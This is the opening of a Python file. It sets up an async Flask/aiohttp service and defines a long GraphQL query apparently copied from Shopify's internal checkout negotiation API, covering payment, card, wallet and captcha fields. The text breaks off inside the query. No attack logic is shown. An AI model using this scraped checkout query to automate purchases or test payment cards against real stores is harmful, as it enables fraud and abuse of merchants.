import asyncio
import aiohttp
import json
import re
import random
import html as html_module
import logging
import traceback
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ==================== GRAPHQL QUERIES ====================

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on 